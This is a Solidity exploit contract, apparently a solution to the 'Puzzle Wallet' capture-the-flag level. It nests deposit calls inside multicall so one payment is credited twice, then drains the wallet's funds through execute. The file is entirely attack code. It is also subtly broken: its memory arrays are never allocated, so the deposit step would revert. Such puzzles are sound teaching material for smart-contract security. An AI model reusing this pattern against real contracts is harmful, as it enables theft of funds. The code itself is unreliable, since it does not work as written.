// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface PuzzleWallet {
    function execute(
        address,
        uint256,
        bytes calldata
    ) external payable;

    function multicall(bytes[] calldata) external payable;
}

contract AttackPuzzleWallet {
    address puzzleWalletProxyAddress;

    constructor(address _puzzleWalletProxyAddress) {
        puzzleWalletProxyAddress = _puzzleWalletProxyAddress;
    }

    function deposit() public payable {
        bytes[] memory data;
        bytes[] memory depositData;

        depositData[0] = abi.encodeWithSignature("deposit()");

        data[0] = abi.encodeWithSignature("multicall(bytes[])", depositData);
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositData);

        PuzzleWallet(puzzleWalletProxyAddress).multicall{
            value: 1000000000000000
        }(data);
    }

    function drain() public {
        bytes memory data = abi.encodeWithSignature("nonExistingFunction()");

        PuzzleWallet(puzzleWalletProxyAddress).execute(
            address(this),
            2000000000000000,
            data
        );
    }

    fallback() external payable {}

    receive() external payable {}
}